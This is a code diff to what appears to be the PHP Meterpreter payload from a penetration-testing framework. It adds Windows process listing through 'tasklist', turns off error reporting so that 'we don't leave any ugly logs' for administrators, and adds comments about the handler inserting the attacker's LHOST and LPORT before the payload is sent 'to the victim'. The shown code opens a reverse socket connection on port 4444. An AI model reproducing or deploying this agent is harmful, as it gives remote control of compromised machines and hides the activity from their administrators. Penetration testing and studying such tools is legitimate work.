@@ -513,7 +513,24 @@ function stdapi_sys_process_get_processes($req, &$pkt) {
     my_print("doing get_processes");
     $list = array();
     if (is_windows()) {
-        # meh
+        # This command produces a line like:
+        #  "tasklist.exe","2264","Console","0","4,556 K","Running","EGYPT-B3E55BF3C\Administrator","0:00:00","OleMainThreadWndName"
+        $output = my_cmd("tasklist /v /fo csv /nh");
+        $lines = explode("\n", trim($output));
+        foreach ($lines as $line) {
+            $line = trim($line);
+            #
+            # Ghetto CSV parsing
+            #
+            $pieces = preg_split('/","/', $line);
+            # Strip off the initial quote on the first and last elements
+            $pieces[0] = substr($pieces[0], 1, strlen($pieces[0]));
+            $cnt = count($pieces);
+            $pieces[$cnt] = substr($pieces[$cnt], 1, strlen($pieces[$cnt]));
+
+            $proc_info = array($pieces[1], $pieces[6], $pieces[0]);
+            array_push($list, $proc_info);
+        }
     } else {
         # This command produces a line like:
         #    1553 root     /sbin/getty -8 38400 tty1
@@ -1136,13 +1153,15 @@ ob_implicit_flush();
 
 # Turn off error reporting so we don't leave any ugly logs.  Why make an
 # administrator's job easier if we don't have to?  =)
-#error_reporting(0);
-error_reporting(E_ALL);
+error_reporting(0);
+#error_reporting(E_ALL);
 
 @ignore_user_abort(true);
 # Has no effect in safe mode, but try anyway
 @set_time_limit(0);
 
+# The payload handler overwrites this with the correct LPORT before sending
+# it to the victim.
 $port = 4444;
 
 $listen = false;
@@ -1171,6 +1190,9 @@ if ($listen) {
     my_print("Got a socket connection $msgsock");
 } else {
     my_print("Connecting to $port");
+
+    # The payload handler overwrites this with the correct LHOST before sending
+    # it to the victim.
     $ipaddr = '127.0.0.1';
     if (is_callable('socket_create')) {
         $msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
